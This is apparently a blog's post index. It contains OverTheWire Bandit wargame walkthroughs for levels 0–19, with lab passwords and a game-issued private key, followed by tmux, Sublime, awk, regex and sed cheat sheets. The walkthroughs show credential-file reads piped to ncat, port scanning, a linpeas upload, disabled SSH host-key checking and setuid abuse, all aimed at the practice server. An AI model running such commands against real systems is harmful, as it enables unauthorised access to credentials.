00:01bandit14@bandit:/tmp/tmp.testing$ cat /etc/bandit_pass/bandit14MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvSbandit14@bandit:/tmp/tmp.testing$ echo \"$(cat /etc/bandit_pass/bandit14)\" | nc localhost 30000Correct!8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQobandit14@bandit:/tmp/tmp.testing$ Explanation  First tried to send the $RANDOM data to the port 30000 using the nc  created the temp upload the linpeas.sh and uploaded the script using the scp as we have the private key  linpeas.sh found the password for the bandit14 user stored in the file /etc/bandit_pass/bandit14  submitted it through nc to port 30000. This allowed you to successfully get the password for the next levelBandit Level 15 → Level 16Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.  Note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.bandit15@bandit:/tmp/t15$ echo \"$(cat /etc/bandit_pass/bandit15)\"| ncat --ssl localhost 30001Correct!kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dxbandit15@bandit:/tmp/t15$Bandit Level 16 → Level 17Level GoalThe credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL/TLS and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.  Note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.bandit16@bandit:~$ nmap -p 31000-32000 --script ssl-enum-ciphers localhostStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 12:37 UTCNmap scan report for localhost (127.0.0.1)Host is up (0.00016s latency).Not shown: 996 closed tcp ports (conn-refused)PORT      STATE SERVICE31046/tcp open  unknown31518/tcp open  unknown| ssl-enum-ciphers:|   TLSv1.2:|     ciphers:|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256 (rsa 4096) - A|     compressors:|       NULL|     cipher preference: client|     warnings:|       Key exchange (secp256r1) of lower strength than certificate key|   TLSv1.3:|     ciphers:|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A|     cipher preference: client|_  least strength: A31691/tcp open  unknown31790/tcp open  unknown| ssl-enum-ciphers:|   TLSv1.2:|     ciphers:|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 4096) - A|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256 (rsa 4096) - A|     compressors:|       NULL|     cipher preference: client|     warnings:|       Key exchange (secp256r1) of lower strength than certificate key|   TLSv1.3:|     ciphers:|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A|     cipher preference: client|_  least strength: A31960/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 0.57 secondsbandit16@bandit:~$ echo \"$(cat /etc/bandit_pass/bandit16)\"| ncat --ssl localhost 31518kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dxbandit16@bandit:~$ echo \"$(cat /etc/bandit_pass/bandit16)\"| ncat --ssl localhost 31790Correct!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----bandit16@bandit:~$ Explanation  First lets scan the open ports on the meachine using the nmap with -p opein with ports 31000 to 32000 using the script ssl-enum-ciphers  As we can see only two ports are lisening with SSL/TLS conneciton  Echo the password with ncat --ssl localhost 31790 to establish an encrypted (SSL/TLS) connection to a service running on port 31790The Nmap cheat sheet is available for quick references and commands here.Bandit Level 17 → Level 18Level GoalThere are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new  Note: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19bandit17@bandit:~$ diff -wy --suppress-common-lines passwords.new passwords.oldx2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO                              | ktfgBvpMzWKR5ENj26IbLGSblgUG9CzBbandit17@bandit:~$Bandit Level 18 → Level 19Level GoalThe password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.❯ sshpass -p \"x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO\" ssh -o \"StrictHostKeyChecking=no\" -p 2220 bandit18@bandit.labs.overthewire.org \"bash --norc\"                         _                     _ _ _                        | |__   __ _ _ __   __| (_) |_                        | '_ \\ / _` | '_ \\ / _` | | __|                        | |_) | (_| | | | | (_| | | |_                        |_.__/ \\__,_|_| |_|\\__,_|_|\\__|                      This is an OverTheWire game server.            More information on http://www.overthewire.org/wargameslsreadmecat readmecGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8^C❯Explanation  The command uses sshpass to provide the password x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO to the ssh command  -o StrictHostKeyChecking=no disables the SSH host key checking, meaning it won’t prompt you about the authenticity of the host (like the warning about adding the host to known_hosts).  bash --norc It will runs the bash shell on the remote machine but skips reading the .bashrc file using the --norc option. This avoids any configurations (like auto-logout) that might be present in the .bashrc file.Bandit Level 19 → Level 20Level GoalTo gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.bandit19@bandit:~$ lsbandit20-dobandit19@bandit:~$ file bandit20-dobandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=368cd8ac4633fabdf3f4fb1c47a250634d6a8347, for GNU/Linux 3.2.0, not strippedbandit19@bandit:~$ ./bandit20-doRun a command as another user.  Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit200qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYObandit19@bandit:~$Explanation  The files in the directory are listed, revealing an executable file named bandit20-do.  The file command identifies it as a setuid ELF executable, meaning it runs with the permissions of its owner.  Executing ./bandit20-do without any arguments provides information that it allows running commands as another user.  The command ./bandit20-do cat /etc/bandit_pass/bandit20 is used to read the password for the next level, bandit20, successfully retrieving the required password.In the next blog We’ll dive into challenges 11 to 20 and share more practical solutions to help you move forward. Stay tuned!"
  },
  
  {
    "title": "OverTheWire Wargames bandit => 1",
    "url": "/posts/bandit-1/",
    "categories": "CTF, community",
    "tags": "",
    "date": "2025-01-24 00:00:00 +0530",
    





    
    "snippet": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthus...",
    "content": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthusiasts looking to expand their skill set in a practical and engaging way.The platform’s wargames are structured to help users progress step-by-step, starting with basic tasks and advancing to more complex challenges. This makes it an excellent tool for learning concepts such as:  Linux/Unix Basics: It introduces beginners to command-line tasks, file manipulation, and system navigation, providing a solid foundation in operating systems.  Networking and Protocols: Challenges related to TCP/IP, HTTP, and other networking protocols teach how to analyze and interact with network traffic, offering insight into penetration testing techniques.  Cryptography: OverTheWire covers fundamental cryptographic concepts, teaching users how to exploit weaknesses in encryption systems and improve their understanding of security protocols.  Web Security: The platform includes practical lessons on common web vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), and other issues that are crucial for web application security.  Reverse Engineering: Users can dive into reverse engineering challenges to understand how to disassemble and manipulate programs, gaining valuable insight into software vulnerabilities.  Forensics: OverTheWire also helps users build skills in digital forensics by analyzing compromised data, investigating file systems, and extracting hidden information.Bandit, the most popular wargame on OverTheWire, is a great starting point for beginners. It introduces users to basic security concepts and Linux commands, offering a fun, interactive way to start learning. As players progress through the game, they tackle increasingly challenging puzzles that simulate real-world hacking scenarios.In essence, OverTheWire offers a unique, hands-on learning experience where users can practice ethical hacking in a safe, controlled environment. Whether you’re looking to break into the world of cybersecurity or deepen your existing knowledge, OverTheWire provides a wealth of challenges to help you sharpen your skills.Let’s get started!Bandit Level 0Level GoalThe goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.ssh bandit0@bandit.labs.overthewire.org -p 2220Bandit Level 0 → Level 1Level GoalThe password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.bandit0@bandit:~$ cat readmeCongratulations on your first steps into the bandit game!!Please make sure you have read the rules at https://overthewire.org/rules/If you are following a course, workshop, walkthrough or other educational activity,please inform the instructor about the rules as well and encourage them tocontribute to the OverTheWire community so we can keep these games free!The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5Ifbandit0@bandit:~$Bandit Level 1 → Level 2Level GoalThe password for the next level is stored in a file called - located in the home directorybandit1@bandit:~$ cat ./-263JGJPfgU6LtdEvgfWU1XP5yac29mFxbandit1@bandit:~$Bandit Level 2 → Level 3Level GoalThe password for the next level is stored in a file called spaces in this filename located in the home directorybandit2@bandit:~$ cat spaces\\ in\\ this\\ filenameMNk8KNH3Usiio41PRUEoDFPqfxLPlSmxbandit2@bandit:~$Bandit Level 3 → Level 4Level GoalThe password for the next level is stored in a hidden file in the inhere directory.bandit3@bandit:~$ lsinherebandit3@bandit:~$ find $pwd -type f./inhere/...Hiding-From-You./.profile./.bashrc./.bash_logoutbandit3@bandit:~$ cat ./inhere/...Hiding-From-You2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJbandit3@bandit:~$Bandit Level 4 → Level 5Level GoalThe password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.bandit4@bandit:~$ find $pwd -type f | grep -v \"profile\\|bashrc\\|bash_logout\" | xargs cat�nS��&lt;��]�W��e�˥m�����O��D��3�    �)Ʈ�#Y��-6c��IR-�$����:��2g��?�����`&gt;5HYA�u���8�g�`0�$`��i�R�,�Λ�:Y���?�%�A����B��ͩȄp��&amp;�y�,�(jo�.at�:uf�^���@}���ߓ��ߤ��W&gt;��#lk�d�ܮ��yE��4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw���/�     ������qGi��,�2�Yb�d6�0]�\\�$�1�%�������o@��b/��ۙ�rOx����h0~ey��c�~�h�n��G1bandit4@bandit:~$bandit4@bandit:~$Bandit Level 5 → Level 6Level GoalThe password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:  human-readable  1033 bytes in size  not executablebandit5@bandit:~$ find $pwd -type f | xargs ls -l --block-size=1 2&gt;/dev/null | grep 1033 | awk '{print $9}' | xargs catHWasnPhtq9AVKe0dmk45nxy20cvUa6EGbandit5@bandit:~$Bandit Level 6 → Level 7Level GoalThe password for the next level is stored somewhere on the server and has all of the following properties:  owned by user bandit7  owned by group bandit6  33 bytes in sizebandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null | xargs catmorbNTDkSW6jIlUc0ymOdMaLnOlFVAajbandit6@bandit:~$Bandit Level 7 → Level 8Level GoalThe password for the next level is stored in the file data.txt next to the word millionthbandit7@bandit:~$ cat data.txt | grep -i millionthmillionth       dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEcbandit7@bandit:~$ Bandit Level 8 → Level 9Level GoalThe password for the next level is stored in the file data.txt and is the only line of text that occurs only oncebandit8@bandit:~$ sort data.txt | uniq -u4CKMh1JI91bUIZZPXDqGanal4xvAg0JM---------------------------------------------------------bandit8@bandit:~$ tr ' ' '\\n' &lt; data.txt | sort | uniq -u4CKMh1JI91bUIZZPXDqGanal4xvAg0JMbandit8@bandit:~$Explanation:tr ‘ ‘ ‘\\n’: Translates spaces to newlines so that each word becomes a separate line (this can be adjusted based on the format of the file).sort data.txt: Sorts the lines in data.txt to prepare for the uniq command.uniq -u: This filters out duplicate lines and only prints the lines that appear exactly once.Bandit Level 9 → Level 10Level GoalThe password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.bandit9@bandit:~$ file data.txtdata.txt: databandit9@bandit:~$ cat data.txt | grep -a \"==========\"�D��]���        �������h#!��Q������J��s�V�zl7����POl%Y]�H��a�^�U␦vTo�D�|�@T����^�N����8?g��}��b�}��?Q#�g��m1x��}========== the�Ѧ+��i�d�W��^�)F1��&gt;)٘S�K�3�PZ���t�&amp;xs肉WB/�2��ÜB��   �Ź/�Bjɢ��␦���&lt;���э�7��&lt;������u�/��d|                                                                                                                    �-������n#��i�u=       ���7�֣�n�)�Uջ��ش��5bBK��K���}x�&gt;}:��4Rl_7gH��D:�27��4����C�F��y��6��!��&amp;���z�B��$�l�_G␦��p�hqI.X���0�2����H����$�Tw��m��⧫���o3�m�t0��p��~�L�3JprD========== passwordi���       �L� ~ˏ��&lt;@��Ȅh�$���%Q5���D��k� �|�3~�T���f�;�o9�s�P#t�+Pe��΢쵟�OqDf��.�8���Czmnf&amp;v���l:��F�X���K���b�M�                               �C���I���Bi�&gt;��Y��Еk���  $�nX��T=~�}*4�a2�?���TO\"'�&amp;�J�~fDV3========== is�d�5z(��#�&amp;s�T!1�0�&amp;p���oq���n�R� ���␦F           ��z�|!�(�i�f��+��A6�4�+'��F���T=��b5�A�}��ٱ�éT:�k���������A����U�2�Qc�ɐ�%#�g+;YA_e�kr�����X53|�f8+e#9���㵴��b�R�+�̊�~&amp;��Oiu���?Vh��M��}^��Qp^�G���==�6��!�s���T:�        ��ʨ�\"u�V�a��-t\\f�g   ]󈍅(�.�ۍg�:7���n�������n�p��������� �������CD�`v�oS�Q�-&lt;␦]�`�@�#H Uum����BiA��j堵��!O�&amp;�����D9========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqeybandit9@bandit:~$Explanation:The -a (or –text) option in grep forces it to treat binary files as text. By default, grep will print a message like “binary file matches” when it encounters binary data, and it won’t show matching lines. The -a option overrides this behavior, allowing grep to search through binary files as if they were text and display matching lines.Key Points:  Default behavior: grep skips binary files and shows “binary file matches” without displaying the match.  With -a: grep processes binary files as text and shows matching lines.  Use case: Useful when you want to search for text in files containing binary data.Bandit Level 10 → Level 11Level GoalThe password for the next level is stored in the file data.txt, which contains base64 encoded databandit10@bandit:~$ lsdata.txtbandit10@bandit:~$ cat data.txt | grep -a [a-zA-Z0-9]VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJyCg==bandit10@bandit:~$ cat data.txt | grep -a [a-zA-Z0-9] | base64 -dThe password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRrbandit10@bandit:~$Explanation:  cat data.txt: Reads the content of data.txt.  grep -a [a-zA-Z0-9]: Filters lines that contain alphanumeric characters (letters and numbers), ignoring others. The -a option ensures binary data is treated as text.  base64 -d: Decodes the alphanumeric text, assuming it is Base64-encoded, back to its original form.If data.txt contains mixed content where some lines are Base64-encoded, this command extracts the encoded lines, decodes them, and shows the original data.These first 10 challenges provide a strong starting point for tackling bandit but there’s more to explore!In the next blog We’ll dive into challenges 11 to 20 and share more practical solutions to help you move forward. Stay tuned!"
  },
  
  {
    "title": "tmux",
    "url": "/posts/tmux/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-20 00:00:00 +0530",
    





    
    "snippet": "🖥️ tmux Session Shortcuts            Shortcut      Action                  tmux      Start new session from prompt              tmux new -s name      Start new session with name ‘name’ from prompt ...",
    "content": "🖥️ tmux Session Shortcuts            Shortcut      Action                  tmux      Start new session from prompt              tmux new -s name      Start new session with name ‘name’ from prompt              tmux a      Attach session from prompt              tmux ls      List sessions from prompt      🖥️ tmux Keybindings            Shortcut      Action                  C-bs      List sessions              C-b$      Name session              C-b:new      New session      🖥️ tmux Window Management            Shortcut      Action                  C-bc      Create window              C-bw      List windows              C-bn      Next window              C-bp      Previous window      🖥️ tmux Window Actions            Shortcut      Action                  C-bf      Find window              C-b,      Name window              C-b&amp;      Kill window      🖥️ tmux Pane Management            Shortcut      Action                  C-b%      Vertical split              C-b\"      Horizontal split              C-bo      Swap panes              C-bq      Show pane numbers              C-bx      Kill pane      🖥️ tmux Pane Layouts            Shortcut      Action                  C-b (space)      Toggle between layouts              C-b{      Move current pane left              C-b}      Move current pane right              C-bz      Toggle pane zoom      🛠️ tmux Session Management            Shortcut      Action                  tmux a -t name      Attach session to named ‘name’ from prompt              tmux kill-session -t name      Kill session named ‘name’ from prompt              C-bd      Detach session              C-bt      Show big clock              C-b?      List shortcuts              C-b:      Open prompt      "
  },
  
  {
    "title": "sublime",
    "url": "/posts/sublime/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-17 00:00:00 +0530",
    





    
    "snippet": "✂️ Vim Line &amp; Navigation Shortcuts            Shortcut      Action                  ^X      Cut line              ^↵      Insert line after              ^⇧↵      Insert line before             ...",
    "content": "✂️ Vim Line &amp; Navigation Shortcuts            Shortcut      Action                  ^X      Cut line              ^↵      Insert line after              ^⇧↵      Insert line before              ^⇧UP      Move line/selection up              ^⇧DOWN      Move line/selection down              ^L      Select line - Repeat to select next lines              ^D      Select word - Repeat select other occurrences              ^M      Go to matching parentheses              ^⇧M      Select all contents of the current parentheses      ✍️ SCF Keyboard Text Editing Shortcuts            Shortcut      Action                  ^K^K      Delete from cursor to end of line              ^K^BACKSPACE      Delete from cursor to start of line              ^]      Indent current line(s)              ^[      Un-indent current line(s)              ^⇧D      Duplicate line(s)              ^J      Join line below to the end of the current line              ^/      Comment/un-comment current line              ^⇧?      Block comment current selection              ^Y      Redo or repeat last keyboard shortcut command              ^⇧V      Paste and indent correctly              ^SPACE      Select next auto-complete suggestion              ^U      Soft undo      🧭 Navigation Shortcuts            Shortcut      Action                  ^P      Quick-open files by name              ^;      Go to word in current file              ^R      Go to symbol              ^G      Go to line in current file      ✂️ Editing Shortcuts            Shortcut      Action                  ⌥.      Close tag              ^K^C      Scroll to selection              ^⇧A      Select tag              ^⇧J      Select indentation              ^⇧SPACE      Select scope              ^K^B      Toggle side bar              ^⇧P      Command prompt      🔍 Find &amp; Replace Shortcuts            Shortcut      Action                  ⇧F3      Find previous              F3      Find next              ^F      Find              ^H      Replace              ^⇧F      Find in files      🖥️ View &amp; Group Shortcuts            Shortcut      Action                  ⌥⇧@      Split view into two columns              ⌥⇧!      Revert view to single column              ⌥⇧%      Set view to grid (4 groups)              ^2      Jump to group 2              ^⇧@      Move file to group 2      ✂️ Text Transformation &amp; Deletion Shortcuts            Shortcut      Action                  ^K^L      Transform to lowercase              ^K^U      Transform to uppercase              ^⇧K      Delete line              ^BACKSPACE      Delete word backwards              ^DEL      Delete word forwards      🖱️ Multi-Cursor &amp; Selection Shortcuts            Shortcut      Action                  ^⌥DOWN      Add new line below with cursor              ^K^D      Skip selection              ^⇧L      Split selection into lines              ⌥F3      Add cursor at all occurrences of a word              ^⌥UP      Add new line above with cursor              ESC      Return to single selection      🗂️ Mark &amp; Code Folding Shortcuts            Shortcut      Action                  ^K^G      Clear mark              ^K^X      Switch location with mark              ^K^A      Select to mark              ^K^      Set mark              ^K^J      Unfold all              ^⇧]      Unfold code              ^⇧[      Fold code      📍 Bookmark Shortcuts            Shortcut      Action                  ⌥F2      Select all bookmarks              ⇧F2      Previous bookmark              F2      Next bookmark              ^F2      Toggle bookmark      "
  },
  
  {
    "title": "awk",
    "url": "/posts/awk/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-14 00:00:00 +0530",
    





    
    "snippet": "AWK  Print the fifth column in a space separated file:awk '{print $5}' filename  Print the second column of the lines containing “something” in a space separated file:awk '/something/ {print $2}' f...",
    "content": "AWK  Print the fifth column in a space separated file:awk '{print $5}' filename  Print the second column of the lines containing “something” in a space separated file:awk '/something/ {print $2}' filename  Print the third column in a comma separated file:awk -F ',' '{print $3}' filename  Sum the values in the first column and print the total:awk '{s+=$1} END {print s}' filename  Sum the values in the first column and pretty-print the values and then the total:awk '{s+=$1; print $1} END {print \"--------\"; print s}' filenameBasics Essential Commands            varibale      ref                  $1      Reference first column              awk ‘/pattern/ {action}’ file      Execute action for matched pattern ‘pattern’ on file ‘file’              ;      Char to separate two actions              print      Print current record line              $0      Reference current record line      Field Matching and Delimiters            varibale      ref                  ^      Match beginning of field              ~      Match opterator              !~      Do not match operator              -F      Command line option to specify input field delimiter              BEGIN      Denotes block executed once at start              END      Denotes block executed once at end              str1 str2      Concat str1 and str2      Common AWK Patterns            varibale      ref                  awk ‘{print $1}’ file↵      Print first field for each record in file              awk ‘/regex/’ file↵      Print only lines that match regex in file              awk ‘!/regex/’ file↵      Print only lines that do not match regex in file              awk ‘$2 == “foo”’ file↵      Print any line where field 2 is equal to “foo” in file              awk ‘$2 != “foo”’ file↵      Print lines where field 2 is NOT equal to “foo” in file              awk ‘$1 ~ /regex/’ file↵      Print line if field 1 matches regex in file              awk ‘$1 !~ /regex/’ file↵      Print line if field 1 does NOT match regex in file      Advanced AWK Operations            varibale      ref                  awk ‘NR!=1{print $1}’ file      Print first field for each record in file excluding the first record              awk ‘END{print NR}’ file      Count lines in file              awk ‘/foo/{n++}; END {print n+0}’ file      Print total number of lines that contain foo              awk ‘{total=total+NF};END{print total}’ file      Print total number of fields in all lines              awk ‘/regex/{getline;print}’ file      Print line immediately after regex, but not line containing regex in file              awk ‘NR==12’ file      Print line number 12 of file              awk ‘length &gt; 32’ file      Print lines with more than 32 characters in file      Core AWK Variables            varibale      ref                  $2      Reference second column              FS      Field separator of input file (default whitespace)              NF      Number of fields in current record              NR      Line number of the current record      File and Record Management Variables            varibale      ref                  FILENAME      Reference current input file              FNR      Reference number of the current record relative to current input file              OFS      Field separator of the outputted data (default whitespace)              ORS      Record separator of the outputted data (default newline)              RS      Record separator of input file (default newline)      Formatting and Environment Variables            varibale      ref                  CONVFMT      Conversion format used when converting numbers (default %.6g)              SUBSEP      Separates multiple subscripts (default 034)              OFMT      Output format for numbers (default %.6g)              ARGC      Argument count, assignable              ARGV      Argument array, assignable              ENVIRON      Array of environment variables      String and Number Manipulation Functions            varibale      ref                  rand      Random number between 0 and 1              index(s,t)      Position in string s where string t occurs, 0 if not found              length(s)      Length of string s (or $0 if no arg)              substr(s,index,len)      Return len-char substring of s that begins at index (counted from 1)              srand      Set seed for rand and return previous seed              int(x)      Truncate x to integer value      String Splitting and Matching            varibale      ref                  split(s,a,fs)      Split string s into array a split by fs, returning length of a              match(s,r)      Position in string s where regex r occurs, or 0 if not found              sub(r,t,s)      Substitute t for first occurrence of regex r in string s (or $0 if s not given)              gsub(r,t,s)      Substitute t for all occurrences of regex r in string s      Input, Output, and Execution Functions            varibale      ref                  getline      Set $0 to next input record from current input file.              toupper(s)      String s to uppercase              tolower(s)      String s to lowercase              system(cmd)      Execute cmd and return exit status      "
  },
  
  {
    "title": "regex",
    "url": "/posts/regex/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2024-12-23 00:00:00 +0530",
    





    
    "snippet": "🔍 Regex Shortcuts            Shortcut      Action                  *      Match preceding character 0 or more times              +      Match preceding character 1 or more times              .     ...",
    "content": "🔍 Regex Shortcuts            Shortcut      Action                  *      Match preceding character 0 or more times              +      Match preceding character 1 or more times              .      Match any single character              x|y      Match either ‘x’ or ‘y’              \\      Escape a special character              b      The character b              abc      The string abc      🧩 Regex Character Class Shortcuts            Shortcut      Action                  \\d      Match a digit character              \\D      Match a non-digit character              \\s      Match a single white space character (space, tab, form feed, or line feed)              \\S      Match a single character other than white space              \\w      Match any alphanumeric character (including underscore)              \\W      Match any non-word character      🔠 Regex Character Set Shortcuts            Shortcut      Action                  [abc]      Match any one of the characters in the set ‘abc’              [^abc]      Match anything not in character set ‘abc’              [\\b]      Match a backspace      🔍 Advanced Regex Shortcuts            Shortcut      Action                  ^      Match beginning of input              $      Match end of input              \\b      Match a word boundary              \\B      Match a non-word boundary              ?=      Lookahead              ?!      Negative lookahead      🔄 Conditional Regex Shortcuts            Shortcut      Action                  ?&lt;=      Lookbehind              ?&lt;!      Negative lookbehind              ?&gt;      Once-only subexpression              ?()      If-then condition              ?()|      If-then-else condition              ?#      Comment      🔢 Regex Quantifier Shortcuts            Shortcut      Action                  {n}      Match exactly n occurrences of preceding character              {n,m}      Match at least n and at most m occurrences of the preceding character              ?      Match 0 or 1 occurrence of preceding character      🧩 Regex Escape Sequences            Shortcut      Action                  \\cX      Match control character X in a string              \\n      Match a line feed              \\r      Match a carriage return              \\t      Match a tab              \\0      Match a NULL      🧩 Advanced Regex Escape Sequences            Shortcut      Action                  \\f      Match a form feed              \\v      Match a vertical tab              \\xhh      Match character with code hh (2 hex digits)              \\uhhhh      Match character with code hhhh (4 hex digits)      🔍 Search Option Shortcuts            Shortcut      Action                  g      Global search              i      Case-insensitive search              m      Multi-line search              y      “Sticky” search match starting at current position in target string      🧑‍🤝‍🧑 Grouping &amp; Back-Reference Shortcuts            Shortcut      Action                  (x)      Match ‘x’ and remember the match              (?:x)      Match ‘x’ but do not remember the match              \\n      A back reference to the last substring matching the n parenthetical in the regex      "
  },
  
  {
    "title": "sed",
    "url": "/posts/sed/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2024-12-20 00:00:00 +0530",
    





    
    "snippet": "Regular expressions.  Replace the first occurrence of a string in a file, and print the result:    sed 's/find/replace/' filename        Replace only on lines matching the line pattern:    sed '/li...",
